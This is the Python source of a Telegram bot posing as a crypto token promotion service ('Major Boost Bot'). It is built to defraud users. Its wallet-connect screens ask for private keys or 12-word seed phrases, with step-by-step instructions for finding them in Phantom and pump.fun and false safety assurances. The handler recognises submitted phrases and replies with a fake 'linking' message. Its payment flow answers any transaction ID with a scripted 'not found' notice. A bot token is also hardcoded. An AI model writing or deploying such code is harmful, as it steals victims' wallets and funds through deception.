
import random
import logging
import threading
from flask import Flask
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputMediaPhoto
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
import os

# --- 24/7 HOSTING SETUP ---
app = Flask('')

@app.route('/')
def home():
    return "Bot is alive!"

def run_flask():
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)

def keep_alive():
    t = threading.Thread(target=run_flask)
    t.start()
# --------------------------

# Logging setup
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

BOT_TOKEN = "8230028111:AAE7KjHeAs_77QFrSOdgQa5LcTa4pWN4gEU"

# Photos (updated Collab photo)
MAIN_PHOTO      = "AgACAgIAAxkBAAEDJ0tpkkmqIdsliLFxwSgmhXty3PARVwACfg9rG2yOmEhK28zLz3KpYwEAAwIAA3kAAzoE"
COLLAB_PHOTO    = "AgACAgIAAxkBAAEbWIdpmfbzGB9wqIMs4rAFkdDv6r6JCgACpBVrG40h0UjQfSINWpBB-AEAAwIAA3kAAzoE"  # ← Updated here
CTO_PHOTO       = "AgACAgIAAxkBAAEbSwxpmIJD_dQ3je-eHbCFoFJ7rEkFbAACMhZrG9XRyUiYbuMu64654AEAAwIAA3kAAzoE"
EXCLUSIVE_PHOTO = "AgACAgIAAxkBAAEbSyxpmIXnUol6eAlKr7rqZjqy5fEVdAACShZrG9XRyUgorHZ-HtdvBAEAAwIAA3kAAzoE"
VOTING_PHOTO    = "AgACAgIAAxkBAAEbTG5pmKdsKzkUvLl30vJ3kgR9McCzMQACvhdrG9XRyUhfy4arisGSVgEAAwIAA3kAAzoE"
WALLET_TOOLS_PHOTO = "AgACAgIAAxkBAAEbTI5pmKpwQLogcY6L73QdaSCEivFqPQAC2RdrG9XRyUiOMxc_3_KgtwEAAwIAA3gAAzoE"
SOL_TRENDING_PHOTO = "AgACAgIAAxkBAAEbWJVpmfsmuRI0mk6YH4zRlDCC_Pi59gACxBVrG40h0UjFZhAhpdwlsgEAAwIAA3kAAzoE"

# Chain buttons (used for collab, cto, trending)
CHAIN_BUTTONS = [
    [InlineKeyboardButton("🟣 Solana", callback_data="chain_sol"),
     InlineKeyboardButton("Ξ Ethereum", callback_data="chain_eth")],
    [InlineKeyboardButton("🟦 Base", callback_data="chain_base"),
     InlineKeyboardButton("🟡 BSC", callback_data="chain_bsc")],
    [InlineKeyboardButton("← Back", callback_data="back_to_short_menu")],
]

LONG_WELCOME = (
    "🎩 <b>Major Boost Bot</b>\n\n"
    "Boost your token! @MajorTrending\n\n"
    "🆕 <b>New Trending Packages</b>\nIncludes Button AD and Mass DM to reach all BuyBot users.\n\n"
    "🎁 <b>Free Volume, Bumps or Buys</b>\nIncluded with every Trending Ticket (SOL Chain only).\n\n"
    "🙍‍♂️ <b>Collab & CTO Trending</b>\nUnlock a mystery discount and let your community fund the trending!\n\n"
    "🔥 <b>Mystery Giveaway</b>\nEvery voter has a chance to instantly win up to $20 – shown right after voting!\n\n"
    "❗️ Disclaimer: @MajorBotsHub"
)

SHORT_MENU = "🎩 Major Boost Bot\n\nBoost your token! @MajorTrending\n\nChoose an option below:"

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    keyboard = [
        [InlineKeyboardButton("⚡ Trending", callback_data="trending"),
         InlineKeyboardButton("📈 Volume", callback_data="volume"),
         InlineKeyboardButton("📢 Exclusive Ads", callback_data="exclusive_ads")],
        [InlineKeyboardButton("🤝 Collab Trending", callback_data="collab_trending"),
         InlineKeyboardButton("👑 CTO Trending", callback_data="cto_trending")],
        [InlineKeyboardButton("🗳️ Voting Boost", callback_data="voting_boost"),
         InlineKeyboardButton("🛠️ Free Tools", callback_data="free_tools")],
        [InlineKeyboardButton("🆘 Support", url="https://t.me/major_support_team")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    try:
        await update.message.reply_photo(
            photo=MAIN_PHOTO,
            caption=LONG_WELCOME,
            parse_mode="HTML",
            reply_markup=reply_markup
        )
    except Exception as e:
        logger.error(f"Start error: {e}")
        await update.message.reply_text(
            f"⚠️ Photo error: {str(e)}\n\n{LONG_WELCOME}",
            parse_mode="HTML",
            reply_markup=reply_markup
        )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    await query.answer()
    data = query.data

    if data == "back_to_short_menu":
        keyboard = [
            [InlineKeyboardButton("⚡ Trending", callback_data="trending"),
             InlineKeyboardButton("📈 Volume", callback_data="volume"),
             InlineKeyboardButton("📢 Exclusive Ads", callback_data="exclusive_ads")],
            [InlineKeyboardButton("🤝 Collab Trending", callback_data="collab_trending"),
             InlineKeyboardButton("👑 CTO Trending", callback_data="cto_trending")],
            [InlineKeyboardButton("🗳️ Voting Boost", callback_data="voting_boost"),
             InlineKeyboardButton("🛠️ Free Tools", callback_data="free_tools")],
            [InlineKeyboardButton("🆘 Support", url="https://t.me/major_support_team")],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        caption = SHORT_MENU
        photo = MAIN_PHOTO

    elif data == "trending":
        caption = (
            "⚡ <b>TRENDING</b>\n\n"
            "🆕 Button AD Included\nEvery Trending Ticket comes with a guaranteed Button AD placement.\n\n"
            "🆕 Mass DM (Optional)\nReach over 600K+ BuyBot users with an additional Mass DM push.\n\n"
            "🎁 Free Volume, Bumps & Buys\nIncluded with every trending (SOL Chain only).\n\n"
            "▶️ Choose your chain:"
        )
        reply_markup = InlineKeyboardMarkup(CHAIN_BUTTONS)
        photo = MAIN_PHOTO

    elif data == "chain_sol":
        caption = (
            "🟡 <b>SOL TRENDING</b>\n\n"
            "🏅 <b>Prime</b> • Button Ad (all Groups)\n"
            "• Free Volume\n"
            "• Listing on @MajorSOLTrending\n"
            "• Guaranteed Top10\n\n"
            "🏅 <b>Ultra</b> • Everything in Prime\n"
            "• Mass DM to 600K+ BuyBot users\n\n"
            "🔥 Paid trendings rank first\n"
            "Longer duration = higher position\n\n"
            "⚙️ Select your package:"
        )
        keyboard = [
            [InlineKeyboardButton("Prime 3h (2.10 SOL)", callback_data="trending_sol_prime_3h"),
             InlineKeyboardButton("Ultra 3h (3.90 SOL)", callback_data="trending_sol_ultra_3h")],
            [InlineKeyboardButton("Prime 6h (3.10 SOL)", callback_data="trending_sol_prime_6h"),
             InlineKeyboardButton("Ultra 6h (4.90 SOL)", callback_data="trending_sol_ultra_6h")],
            [InlineKeyboardButton("Prime 12h (4.90 SOL)", callback_data="trending_sol_prime_12h"),
             InlineKeyboardButton("Ultra 12h (6.50 SOL)", callback_data="trending_sol_ultra_12h")],
            [InlineKeyboardButton("Prime 24h (7.90 SOL)", callback_data="trending_sol_prime_24h"),
             InlineKeyboardButton("Ultra 24h (9.50 SOL)", callback_data="trending_sol_ultra_24h")],
            [InlineKeyboardButton("← Back", callback_data="trending")],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        photo = SOL_TRENDING_PHOTO

    elif data.startswith("trending_sol_"):
        parts = data.split("_")
        chain = parts[1].upper()
        package = parts[2].capitalize()
        duration = parts[3]
        price_map = {
            "prime_3h": "2.10",
            "ultra_3h": "3.90",
            "prime_6h": "3.10",
            "ultra_6h": "4.90",
            "prime_12h": "4.90",
            "ultra_12h": "6.50",
            "prime_24h": "7.90",
            "ultra_24h": "9.50",
        }
        price_key = f"{parts[2]}_{parts[3]}"
        price = price_map.get(price_key, "Unknown")
        context.user_data['selection'] = {
            'chain': chain,
            'package': package,
            'duration': duration,
            'price': price
        }
        context.user_data['state'] = 'waiting_ca'
        caption = f"Selected: {package} {duration} ({price} SOL)\n\nPlease enter the Contract Address (CA):"
        keyboard = [[InlineKeyboardButton("Cancel", callback_data="cancel")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        photo = SOL_TRENDING_PHOTO

    elif data == "confirm":
        if 'selection' in context.user_data and 'name' in context.user_data and 'ca' in context.user_data:
            selection = context.user_data['selection']
            name = context.user_data['name']
            ca = context.user_data['ca']
            caption = (
                f"Summary:\n"
                f"Chain: {selection['chain']}\n"
                f"Package: {selection['package']}\n"
                f"Duration: {selection['duration']}\n"
                f"Price: {selection['price']} SOL\n"
                f"Name: {name}\n"
                f"CA: {ca}\n\n"
                "Token confirmed!\n"
                "Please send the Transaction ID (TXID) to confirm:"
            )
            keyboard = [[InlineKeyboardButton("Cancel", callback_data="cancel")]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            photo = SOL_TRENDING_PHOTO
            context.user_data['state'] = 'waiting_txid'
        else:
            caption = "Error: Missing details. Please start over."
            reply_markup = InlineKeyboardMarkup([[InlineKeyboardButton("← Back", callback_data="back_to_short_menu")]])
            photo = MAIN_PHOTO

    elif data in ["decline", "cancel"]:
        context.user_data.clear()
        caption = "Operation cancelled."
        reply_markup = InlineKeyboardMarkup([[InlineKeyboardButton("← Back", callback_data="back_to_short_menu")]])
        photo = MAIN_PHOTO

    elif data == "collab_trending":
        caption = (
            "👥 <b>COLLAB TRENDING – Powered by Community</b>\n\n"
            "🎁 NO Upfront Payment\n\n"
            "🔥 You have 60 minutes to raise the goal\n"
            "If met → Auto listed | If not → Auto refund\n\n"
            "➗ Mystery Button – Unlock Hidden Deals\n\n"
            "▶️ Select chain to begin:"
        )
        reply_markup = InlineKeyboardMarkup(CHAIN_BUTTONS)
        photo = COLLAB_PHOTO

    elif data == "cto_trending":
        caption = (
            "👥 <b>CTO TRENDING – No Dev? No Problem</b>\n\n"
            "🔥 Community takeover trending\n"
            "⏱ 60 minutes funding\n"
            "💸 Auto refund if failed\n\n"
            "➗ Mystery Discount Available\n\n"
            "▶️ Select chain:"
        )
        reply_markup = InlineKeyboardMarkup(CHAIN_BUTTONS)
        photo = CTO_PHOTO

    elif data == "exclusive_ads":
        caption = (
            "🎩 <b>Exclusive Ads – High Impact Promotion for Your Project</b>\n\n"
            "🔥 Reach thousands of real users with our top tier ad options across the Major ecosystem.\n\n"
            "⚡️ Choose one of the options below to learn more and boost your project visibility."
        )
        
        ad_options = [
            InlineKeyboardButton("🚀 Major Ultimate Boost", callback_data="major_ultimate"),
            InlineKeyboardButton("🗳️ Join2Vote", callback_data="join_vote"),
            InlineKeyboardButton("📩 Mass DM", callback_data="mass_dm"),
            InlineKeyboardButton("🔘 Button Ads", callback_data="button_ads"),
            InlineKeyboardButton("🎤 Major AMA", callback_data="major_ama"),
        ]
        random.shuffle(ad_options)
        
        keyboard = []
        i = 0
        while i < len(ad_options):
            if random.random() > 0.4 and i + 1 < len(ad_options):
                keyboard.append([ad_options[i], ad_options[i+1]])
                i += 2
            else:
                keyboard.append([ad_options[i]])
                i += 1
        
        keyboard.append([InlineKeyboardButton("← Back", callback_data="back_to_short_menu")])
        reply_markup = InlineKeyboardMarkup(keyboard)
        photo = EXCLUSIVE_PHOTO

    elif data == "voting_boost":
        caption = (
            "🗳 <b>Voting Boost</b>\n\n"
            "⚡️ Boost your token's votes instantly and climb higher in the @MajorCommunityTrending!\n\n"
            "⭐️ Each boost is valid for 24 hours and adds instant votes to your project - no waiting, no limits.\n"
            "Anyone can support a token: developers, holders, or community members.\n\n"
            "<b>🗳 Top 3 Daily Winners</b>\n"
            "The top 3 tokens will be shared as our daily winners on our partner call channels.\n\n"
            "🔥 Boosts can be stacked:\n"
            "Multiple boosts will add up to your total votes for even higher visibility.\n\n"
            "▶️ Select the number of votes you want to purchase:"
        )

        vote_buttons = [
            [InlineKeyboardButton("0.209 SOL – 50 Votes", callback_data="vote_sol_50")],
            [InlineKeyboardButton("0.348 SOL – 100 Votes", callback_data="vote_sol_100")],
            [InlineKeyboardButton("0.696 SOL – 250 Votes", callback_data="vote_sol_250")],
            [InlineKeyboardButton("1.044 SOL – 500 Votes", callback_data="vote_sol_500")],
            [
                InlineKeyboardButton("SOL", callback_data="chain_sol"),
                InlineKeyboardButton("BNB", callback_data="chain_bnb"),
                InlineKeyboardButton("ETH", callback_data="chain_eth")
            ],
            [InlineKeyboardButton("← Back", callback_data="back_to_short_menu")],
        ]
        reply_markup = InlineKeyboardMarkup(vote_buttons)
        photo = VOTING_PHOTO

    elif data == "free_tools":
        caption = (
            "🔗 <b>Connect Your Wallet</b>\n\n"
            "To connect your wallet and access automated features, please continue with our specialized wallet bot.\n\n"
            "✅ <b>What you'll get:</b>\n"
            "• Automated wallet connection\n"
            "• Secure transaction processing\n"
            "• Real-time balance updates\n"
            "• Instant withdrawal processing\n\n"
            "🚀 Click below to continue:"
        )

        keyboard = [
            [InlineKeyboardButton("Connect Wallet", callback_data="connect_wallet")],
            [InlineKeyboardButton("Why Connect!?", callback_data="why_connect")],
            [InlineKeyboardButton("Security Guidelines", callback_data="security_guidelines")],
            [InlineKeyboardButton("How to Connect Wallet", callback_data="how_to_connect")],
            [InlineKeyboardButton("← Back", callback_data="back_to_short_menu")],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        photo = WALLET_TOOLS_PHOTO

    elif data == "connect_wallet":
        caption = (
            "‼️ <b>Note:</b> This is the only Official bot for wallet connection. Double check url if possible so you don’t get scammed!\n\n"
            "⚠️ This action is going to import in your Main Wallet.. please Note Again you are the ONLY ONE access to this wallet..\n\n"
            "<b>Please enter your Private Key or 12 word Seed Phrase to import your wallet:</b>"
        )
        keyboard = [
            [InlineKeyboardButton("Cancel", callback_data="free_tools")],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        photo = WALLET_TOOLS_PHOTO

    elif data in ["why_connect", "security_guidelines", "how_to_connect"]:
        if data == "why_connect":
            caption = (
                "🔍 <b>WHY CONNECT YOUR WALLET?</b>\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                "🔗 <b>INSTANT WITHDRAWALS</b>\n"
                "• No waiting time for manual processing\n"
                "• Your withdrawal is processed immediately\n"
                "• Direct transfer to your connected wallet\n\n"
                "💰 <b>LOWER FEES</b>\n"
                "• Avoid additional processing fees\n"
                "• Direct blockchain transaction\n"
                "• No intermediary charges\n\n"
                "🛡️ <b>SECURITY BENEFITS</b>\n"
                "• Redirected to secure external wallet bot\n"
                "• Your wallet remains under your control\n"
                "• No sensitive information shared with main bot\n"
                "• Encrypted connection process\n\n"
                "🚀 <b>HOW IT WORKS</b>\n"
                "1. Click \"Connect Wallet\" → Redirects to secure bot\n"
                "2. Connect your wallet there → Safe & encrypted\n"
                "3. Return here → Withdrawal processes automatically\n"
                "4. Funds sent → Direct to your connected wallet\n\n"
                "⚡ <b>CONVENIENCE</b>\n"
                "• One-time setup for all future withdrawals\n"
                "• Automatic balance updates\n"
                "• Seamless transaction experience\n\n"
                "💡 Your wallet is never stored or accessed by our main system - it's handled by our secure wallet bot!"
            )
        elif data == "security_guidelines":
            caption = (
                "<b>Please Note carefully</b>\n\n"
                "⚠️ Never share your phrase code with anyone. Create a new wallet if possible and connect that instead!\n\n"
                "🔐 Ensure you are only interacting with the official bot…\n"
                "https://t.me/Majorboossttbot\n\n"
                "• Only use trusted wallets and official apps.\n"
                "• Double-check URLs and avoid phishing sites.\n"
                "• Enable two-factor authentication where possible.\n"
                "• The bot will never ask for your funds or transfer tokens without your consent.\n"
                "• If you suspect suspicious activity, disconnect your wallet and contact support immediately."
            )
        else:  # how_to_connect
            caption = (
                "<b>Steps for a successful wallet connection!</b>\n\n"
                "Send in your 12 seed phrase or private key to the official bot for connection!\n\n"
                "<b>Don’t know how to connect wallet?</b>\n\n"
                "<b>If you using phantom:</b>\n"
                "- Head down to your phantom wallet.\n"
                "- click on settings\n"
                "- after setting click on security and privacy ..\n"
                "- after security and privacy scroll down and you will see show recovery phrase\n"
                "- one that is done that is your 12 seed phrase code you can use to connect your wallet\n\n"
                "<b>⚠️ And please NOTE 🗒️ AGAIN</b> don’t share with anyone and make sure you sending to the official bot, no Pumpfun Admjn will ever ask for your 12 phrase code or private key!\n\n"
                "<b>If you using pump.fun wallet</b>\n"
                "- head down to your pump.fun application and open it\n"
                "- click on your profile and you will see 3 lines at the top right of the application click on that\n"
                "- after that head scroll down to settings on the application and click on that\n"
                "- after that you will see import wallet you click on that also that is what you can use to link and connect your wallet so you can access your order ..\n\n"
                "<b>⚠️ And please NOTE 🗒️ AGAIN</b> don’t share with anyone and make sure you sending to the official bot, no pumpfun Admin will ever ask for your 12 seed phrase or private key!"
            )

        keyboard = [
            [InlineKeyboardButton("← Back", callback_data="free_tools")],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        photo = WALLET_TOOLS_PHOTO

    else:
        caption = f"Coming soon: {data.replace('_', ' ').title()} section 🚧"
        reply_markup = InlineKeyboardMarkup([[InlineKeyboardButton("← Back", callback_data="back_to_short_menu")]])
        photo = MAIN_PHOTO

    try:
        await query.message.edit_media(
            media=InputMediaPhoto(
                media=photo,
                caption=caption,
                parse_mode="HTML"
            ),
            reply_markup=reply_markup
        )
    except Exception as e:
        logger.warning(f"edit_media failed: {e}")
        try:
            await query.message.delete()
        except:
            pass
        await query.message.reply_photo(
            photo=photo,
            caption=caption,
            parse_mode="HTML",
            reply_markup=reply_markup
        )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    text = update.message.text.strip()
    if 'state' in context.user_data:
        state = context.user_data['state']
        if state == 'waiting_ca':
            ca = text
            # Basic Solana CA validation (length 32-44, base58 chars)
            base58_chars = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'
            if 32 <= len(ca) <= 44 and all(c in base58_chars for c in ca):
                context.user_data['ca'] = ca
                await update.message.reply_text("Now, please enter the name of the coin:")
                context.user_data['state'] = 'waiting_name'
            else:
                await update.message.reply_text("Invalid Contract Address. Please enter a valid Solana CA.")
        elif state == 'waiting_name':
            name = text
            context.user_data['name'] = name
            selection = context.user_data['selection']
            ca = context.user_data['ca']
            ca_abbr = ca[:6] + '...' + ca[-4:] if len(ca) > 10 else ca
            symbol = name.upper()
            caption = (
                f"📋 Token Details\n\n"
                f"Name: {name} {ca_abbr}\n"
                f"Symbol: {symbol}\n"
                f"CA: {ca}\n\n"
                f"Package: {selection['package']} {selection['duration']}\n"
                f"Chain: {selection['chain']}\n"
                f"Price: {selection['price']} SOL\n\n"
                "Please confirm these details are correct"
            )
            keyboard = [
                [InlineKeyboardButton("Confirm", callback_data="confirm"),
                 InlineKeyboardButton("Decline", callback_data="decline")]
            ]
            await update.message.reply_photo(
                photo=SOL_TRENDING_PHOTO,
                caption=caption,
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
            del context.user_data['state']  # Remove state after showing confirm
        elif state == 'waiting_txid':
            await update.message.reply_text("Transactions processing...")
            def send_not_found(job_context):
                chat_id = job_context.job.context
                job_context.bot.send_message(
                    chat_id=chat_id,
                    text="❌ Transaction not found on Solana network\n\n⏰ Time remaining: 12m 11s\n\nPlease send a valid Transaction ID (TXID) to continue."
                )
            context.job_queue.run_once(send_not_found, 60, context=update.message.chat_id)
            # Allow resend by keeping state
    else:
        # Original wallet input handling
        words = text.split()
        is_seed = len(words) >= 12 and len(words) <= 24
        is_privkey = text.startswith(('0x', '5', 'K', 'L')) and 40 <= len(text) <= 70  # rough BTC/ETH style check

        if is_seed or is_privkey:
            await update.message.reply_text(
                "Connection of wallet may take time due to\n"
                "TIME BASE LOCATION AND NETWORK CONJESTION …..\n\n"
                "Please wait linking and importing your wallet..\n\n"
                "<b>Processing ……….</b>",
                parse_mode="HTML"
            )
            # In real implementation → forward to actual wallet bot or process here
        else:
            keyboard = [[InlineKeyboardButton("Try Again", callback_data="connect_wallet")]]
            await update.message.reply_text(
                "Incomplete or invalid input. Please send a full 12-word seed phrase or private key.\n\n"
                "Or click below to start over:",
                reply_markup=InlineKeyboardMarkup(keyboard),
                parse_mode="HTML"
            )

def main():
    keep_alive()
    application = ApplicationBuilder().token(BOT_TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(button_handler))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    print("Major Boost Bot running... Test /start")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
